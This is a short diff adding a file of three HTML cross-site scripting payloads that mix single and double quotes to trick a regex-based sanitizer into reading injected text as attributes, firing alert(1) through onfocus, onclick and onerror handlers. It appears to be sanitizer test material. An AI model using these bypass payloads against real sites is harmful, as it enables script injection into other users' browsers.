@@ -1,0 +1,7 @@
+# Payloads to extend regex end using mixed quotes
+# Goal: make the match stop later, promoting following text as attributes
+
+<a title='attribute="' href="new title' onfocus=alert(1) x='y'">t</a>
+<a data-x='attribute="' href="a' onclick=alert(1) y='z'">t</a>
+<img alt='attribute="' src="x' onerror=alert(1) y='z'">
+
